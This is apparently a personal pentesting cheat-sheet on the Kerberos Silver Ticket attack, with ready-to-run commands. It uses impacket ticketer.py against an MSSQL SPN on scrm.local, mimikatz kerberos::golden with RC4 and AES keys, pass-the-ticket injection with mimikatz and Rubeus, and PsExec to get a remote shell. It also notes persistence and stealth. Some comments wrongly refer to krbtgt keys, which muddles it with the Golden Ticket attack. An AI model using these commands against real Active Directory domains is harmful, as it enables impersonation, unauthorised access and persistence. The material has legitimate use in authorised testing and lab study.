
- Attack against **service accounts** (accounts with SPNs) or computer accounts that are running services
- Forge a Service Ticket to gain access to a **specific service or resource** to also provide persistance 
- Works because service tickets are encrypted with the **service account's password hash**
- The PAC inside the ticket is signed with the _service account's_ key, and the service usually doesn't validate it against the DC
- we can impersonate who we want 


**SPN = Service Principal Name**
- It’s basically a **unique identifier** for a **service** (like MSSQL, HTTP, CIFS, LDAP) tied to the user or computer account running it.

**Steps:**

1. Get the service account's NT hash
2. Use the service account hash to forge a Service Ticket for a specific service (e.g., a file share on CIFS/[server.domain.com](https://server.domain.com))
3. Present the forged ticket directly to the target service to access its resources
4. Gain access to the specific server/resource, bypassing the Domain Controller entirely

```sh
#prerequisits
#NThash SA
#SID sa


#impacket 
ticketer.py -nthash <HASH> -domain-sid <SID> -domain scrm.local -spn MSSQLSvc/dc1.scrm.local:1433 Administrator


# To generate the TGS with NTLM of krbtgt
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /rc4:<ntlm_hash> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>

# To generate the TGS with AES 128 key
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>

# To generate the TGS with AES 256 key (more secure encryption, probably more stealth due is the used by default by Microsoft)
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>

# Inject TGS
mimikatz # kerberos::ptt <ticket_kirbi_file>
.\Rubeus.exe ptt /ticket:<ticket_kirbi_file>

#cmd in remote machine 
.\PsExec.exe -accepteula \\<remote_hostname> cmd

